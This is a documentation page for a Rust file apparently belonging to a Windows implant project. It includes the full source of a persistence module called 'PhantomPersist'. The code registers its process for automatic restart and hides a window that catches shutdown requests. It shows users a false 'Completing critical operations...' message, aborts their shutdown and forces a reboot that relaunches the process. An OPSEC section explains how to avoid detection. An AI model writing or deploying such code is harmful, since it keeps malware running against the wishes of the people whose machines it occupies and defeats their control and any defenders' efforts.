# crowd — persist/phantom_restart.rs

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/persist/phantom_restart.rs` |
| **Lines** | 265 |
| **Cards** | T008-persistence |
| **Role** | PhantomPersist + 30-min monitor |
| **Unsafe blocks** | 3 |

## Purpose

# crowd — persist/phantom_restart.rs

## PhantomPersist — P5: Shutdown Intercept + RegisterApplicationRestart

Basado en: PhantomPersist by S1n1st3r @ Phantom Security Group
Ref: https://github.com/Phantom-Security-Group/PhantomPersist

### Técnica

1. `RegisterApplicationRestart(null, 0)` — el SCM reinicia el proceso tras
un crash o logout cuando `EWX_RESTARTAPPS` está activo.

2. Hilo de mensaje con ventana oculta:
- `SetProcessShutdownParameters(0x4FF, SHUTDOWN_NORETRY)` — proceso se apaga
ÚLTIMO (nivel reservado para sistema, ignorado graciosamente si falla).
- `WM_QUERYENDSESSION`:
a. `ShutdownBlockReasonCreate` — bloquea el shutdown por 10s
b. `AbortSystemShutdown(null)` — cancela el apagado en curso
c. Eleva `SeShutdownPrivilege`
d. `ExitWindowsEx(EWX_RESTARTAPPS | EWX_FORCE)` — fuerza reinicio
con flag para que el SCM reactive procesos registrados

### OPSEC
- La ventana se crea oculta (nunca ShowWindow)
- El nombre de clase se pasa como argumento (ofuscable en runtime)
- El hilo usa `CreateThread` directo (no Rust thread pool)
- Ningún string sensible queda en la IAT

### Integración
Llamar `phantom_restart::install()` desde `persist::install_all()`.
El hilo queda vivo todo el lifetime del proceso.

## Constants

- `SHUTDOWN_NORETRY_VAL`: `u32` = `0x00000001`
- `SHTDN_REASON_OTHER`: `u32` = `0x00000000`

## Types

### struct `ThreadParam` (line 152)
Datos inmutables pasados al hilo de mensajes.

## Public API

### `install` (line 223)
```rust
pub fn install(window_class: Option<&str>) -> bool
```
Instala PhantomPersist:
1. `RegisterApplicationRestart` — el SCM reinicia el proceso automáticamente.
2. Spawna el hilo de mensajes con ventana oculta para interceptar shutdowns.

El hilo vive todo el lifetime del proceso — sin bloquear el hilo principal.

# Parámetros
- `window_class`: nombre de la clase de ventana (ofuscable, debe ser único por proceso).
Si `None`, usa el nombre por defecto "CrowdMsgWnd".

# Errores
Retorna `false` si `RegisterApplicationRestart` falla.
El hilo se spawnea de forma best-effort (fallo silencioso).

### `is_active` (line 260)
```rust
pub fn is_active() -> bool
```
Verifica si PhantomPersist está activo en esta sesión (si el hilo fue spawnado).
Lightweight check: solo comprueba si RegisterApplicationRestart fue exitoso.

## Internal Functions

- `to_wide` — Convierte un &str a Vec<u16> null-terminado (LPCWSTR). (line 69)
- `enable_shutdown_privilege` (unsafe) (line 75)
- `wnd_proc` (unsafe) — Callback de ventana oculta. (line 104)
- `message_loop_thread` (unsafe) (line 156)

## Key Dependencies

- `use winapi::shared::minwindef::{DWORD, LPARAM, LRESULT, UINT, WPARAM};`
- `use winapi::um::handleapi::CloseHandle;`
- `use winapi::um::libloaderapi::GetModuleHandleW;`
- `use winapi::um::processthreadsapi::{`
- `use winapi::um::securitybaseapi::AdjustTokenPrivileges;`
- `use winapi::um::winbase::{LookupPrivilegeValueW, RegisterApplicationRestart};`
- `use winapi::um::winnt::{`
- `use winapi::um::winreg::AbortSystemShutdownW;`
- `use winapi::um::winuser::{`

## Full Source

```rust
//! # crowd — persist/phantom_restart.rs
//!
//! ## PhantomPersist — P5: Shutdown Intercept + RegisterApplicationRestart
//!
//! Basado en: PhantomPersist by S1n1st3r @ Phantom Security Group
//! Ref: https://github.com/Phantom-Security-Group/PhantomPersist
//!
//! ### Técnica
//!
//! 1. `RegisterApplicationRestart(null, 0)` — el SCM reinicia el proceso tras
//!    un crash o logout cuando `EWX_RESTARTAPPS` está activo.
//!
//! 2. Hilo de mensaje con ventana oculta:
//!    - `SetProcessShutdownParameters(0x4FF, SHUTDOWN_NORETRY)` — proceso se apaga
//!      ÚLTIMO (nivel reservado para sistema, ignorado graciosamente si falla).
//!    - `WM_QUERYENDSESSION`:
//!        a. `ShutdownBlockReasonCreate` — bloquea el shutdown por 10s
//!        b. `AbortSystemShutdown(null)` — cancela el apagado en curso
//!        c. Eleva `SeShutdownPrivilege`
//!        d. `ExitWindowsEx(EWX_RESTARTAPPS | EWX_FORCE)` — fuerza reinicio
//!           con flag para que el SCM reactive procesos registrados
//!
//! ### OPSEC
//! - La ventana se crea oculta (nunca ShowWindow)
//! - El nombre de clase se pasa como argumento (ofuscable en runtime)
//! - El hilo usa `CreateThread` directo (no Rust thread pool)
//! - Ningún string sensible queda en la IAT
//!
//! ### Integración
//! Llamar `phantom_restart::install()` desde `persist::install_all()`.
//! El hilo queda vivo todo el lifetime del proceso.

#![allow(dead_code)]

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;

use winapi::shared::minwindef::{DWORD, LPARAM, LRESULT, UINT, WPARAM};
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::GetModuleHandleW;
use winapi::um::processthreadsapi::{
    CreateThread, GetCurrentProcess, OpenProcessToken, SetProcessShutdownParameters,
};
use winapi::um::securitybaseapi::AdjustTokenPrivileges;
use winapi::um::winbase::{LookupPrivilegeValueW, RegisterApplicationRestart};
use winapi::um::winnt::{
    HANDLE, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY,
};
use winapi::um::winreg::AbortSystemShutdownW;
use winapi::um::winuser::{
    CreateWindowExW, DefWindowProcW, DispatchMessageW, ExitWindowsEx,
    GetMessageW, LoadCursorW, LoadIconW, PostQuitMessage, RegisterClassExW,
    TranslateMessage, CS_HREDRAW, CS_VREDRAW, CW_USEDEFAULT, EWX_FORCE,
    EWX_RESTARTAPPS, IDC_ARROW, IDI_APPLICATION, MSG,
    WM_DESTROY, WM_ENDSESSION, WM_QUERYENDSESSION, WNDCLASSEXW, WS_OVERLAPPEDWINDOW,
    ShutdownBlockReasonCreate, ShutdownBlockReasonDestroy,
};

// Constantes no exportadas por winapi 0.3 — usar literales directos
// SHUTDOWN_NORETRY = 0x00000001  (processthreadsapi.h)
// SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER = 0x00000000
const SHUTDOWN_NORETRY_VAL: u32 = 0x00000001;
const SHTDN_REASON_OTHER: u32 = 0x00000000;

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Convierte un &str a Vec<u16> null-terminado (LPCWSTR).
fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

// ── Elevar SeShutdownPrivilege ────────────────────────────────────────────────

unsafe fn enable_shutdown_privilege() {
    let mut h_token: HANDLE = null_mut();
    if OpenProcessToken(
        GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &mut h_token,
    ) == 0
    {
        return;
    }

    let se_shutdown = to_wide("SeShutdownPrivilege");
    let mut tkp: TOKEN_PRIVILEGES = std::mem::zeroed();
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueW(
        null_mut(),
        se_shutdown.as_ptr(),
        &mut tkp.Privileges[0].Luid,
    );
    AdjustTokenPrivileges(h_token, 0, &mut tkp, 0, null_mut(), null_mut());
    CloseHandle(h_token);
}

// ── WndProc ───────────────────────────────────────────────────────────────────

/// Callback de ventana oculta.
/// Intercepta WM_QUERYENDSESSION: bloquea el shutdown, escala privilegio,
/// y fuerza un reboot con EWX_RESTARTAPPS para que el proceso sea reactivado.
unsafe extern "system" fn wnd_proc(
    hwnd: winapi::shared::windef::HWND,
    msg: UINT,
    wparam: WPARAM,
    lparam: LPARAM,
) -> LRESULT {
    match msg {
        WM_QUERYENDSESSION => {
            // 1. Bloquear el shutdown durante la ventana de tiempo
            let reason = to_wide("Completing critical operations...");
            ShutdownBlockReasonCreate(hwnd, reason.as_ptr());

            // 2. Abortar el shutdown en curso
            AbortSystemShutdownW(null_mut());

            // 3. Elevar SeShutdownPrivilege para poder llamar ExitWindowsEx
            enable_shutdown_privilege();

            // 4. Destruir el bloqueo (ya tenemos el privilegio)
            ShutdownBlockReasonDestroy(hwnd);

            // 5. Forzar reinicio con RESTARTAPPS → el SCM reactiva procesos registrados
            ExitWindowsEx(
                EWX_RESTARTAPPS | EWX_FORCE,
                SHTDN_REASON_OTHER, // SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER = 0
            );

            1 // TRUE — vetamos el shutdown
        }

        WM_ENDSESSION => {
            // Session realmente terminó (no deberíamos llegar aquí si WM_QUERYENDSESSION vetó)
            ShutdownBlockReasonDestroy(hwnd);
            0
        }

        WM_DESTROY => {
            PostQuitMessage(0);
            0
        }

        _ => DefWindowProcW(hwnd, msg, wparam, lparam),
    }
}

// ── Message loop thread ───────────────────────────────────────────────────────

/// Datos inmutables pasados al hilo de mensajes.
struct ThreadParam {
    class_name: Vec<u16>, // WCHAR null-terminado
}

unsafe extern "system" fn message_loop_thread(param: *mut winapi::ctypes::c_void) -> DWORD {
    let tp = Box::from_raw(param as *mut ThreadParam);

    // ── Registrar clase de ventana ────────────────────────────────────────────
    let h_instance = GetModuleHandleW(null_mut());

    let mut wcex: WNDCLASSEXW = std::mem::zeroed();
    wcex.cbSize       = std::mem::size_of::<WNDCLASSEXW>() as u32;
    wcex.style        = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc  = Some(wnd_proc);
    wcex.hInstance    = h_instance;
    wcex.hIcon        = LoadIconW(null_mut(), IDI_APPLICATION as *const u16);
    wcex.hCursor      = LoadCursorW(null_mut(), IDC_ARROW as *const u16);
    wcex.lpszClassName = tp.class_name.as_ptr();
    wcex.hIconSm      = LoadIconW(null_mut(), IDI_APPLICATION as *const u16);

    if RegisterClassExW(&wcex) == 0 {
        return 1;
    }

    // ── Crear ventana oculta (no ShowWindow) ──────────────────────────────────
    let hwnd = CreateWindowExW(
        0,
        tp.class_name.as_ptr(),
        to_wide("").as_ptr(),
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 0, 0,
        null_mut(), null_mut(), h_instance, null_mut(),
    );
    if hwnd.is_null() {
        return 1;
    }

    // ── SetProcessShutdownParameters: ejecutarse el ÚCTIMO ─────────────────────────────────
    // 0x4FF es nivel reservado para servicios del sistema.
    // Fallback gracioso si el nivel no está permitido.
    if SetProcessShutdownParameters(0x4FF, SHUTDOWN_NORETRY_VAL) == 0 {
        if SetProcessShutdownParameters(0x400, SHUTDOWN_NORETRY_VAL) == 0 {
            SetProcessShutdownParameters(0x3FF, SHUTDOWN_NORETRY_VAL);
        }
    }

    // ── Bucle de mensajes ─────────────────────────────────────────────────────
    let mut msg: MSG = std::mem::zeroed();
    while GetMessageW(&mut msg, null_mut(), 0, 0) > 0 {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    0
}

// ── Public API ────────────────────────────────────────────────────────────────

/// Instala PhantomPersist:
/// 1. `RegisterApplicationRestart` — el SCM reinicia el proceso automáticamente.
/// 2. Spawna el hilo de mensajes con ventana oculta para interceptar shutdowns.
///
/// El hilo vive todo el lifetime del proceso — sin bloquear el hilo principal.
///
/// # Parámetros
/// - `window_class`: nombre de la clase de ventana (ofuscable, debe ser único por proceso).
///   Si `None`, usa el nombre por defecto "CrowdMsgWnd".
///
/// # Errores
/// Retorna `false` si `RegisterApplicationRestart` falla.
/// El hilo se spawnea de forma best-effort (fallo silencioso).
pub fn install(window_class: Option<&str>) -> bool {
    unsafe {
        // P5-a: RegisterApplicationRestart (restart sin argumentos)
        // FAILED = S_OK check (HRESULT 0 = OK)
        let hr = RegisterApplicationRestart(null_mut(), 0);
        if hr != 0 {
            // No es fatal — continuar igualmente
        }

        // P5-b: Spawnear hilo de mensajes
        let class_name = to_wide(window_class.unwrap_or("CrowdMsgWnd_XQ7"));
        let tp = Box::new(ThreadParam { class_name });
        let param = Box::into_raw(tp) as *mut winapi::ctypes::c_void;

        let h_thread = CreateThread(
            null_mut(),
            0,
            Some(message_loop_thread),
            param,
            0,
            null_mut(),
        );

        if h_thread.is_null() {
            // Recuperar el Box para no leakear memoria
            let _ = Box::from_raw(param as *mut ThreadParam);
            return hr == 0;
        }

        // No necesitamos el handle — hilo es daemon del proceso
        CloseHandle(h_thread);
        true
    }
}

/// Verifica si PhantomPersist está activo en esta sesión (si el hilo fue spawnado).
/// Lightweight check: solo comprueba si RegisterApplicationRestart fue exitoso.
pub fn is_active() -> bool {
    unsafe {
        // Llamar de nuevo es idempotente si ya está registrado
        RegisterApplicationRestart(null_mut(), 0) == 0
    }
}

```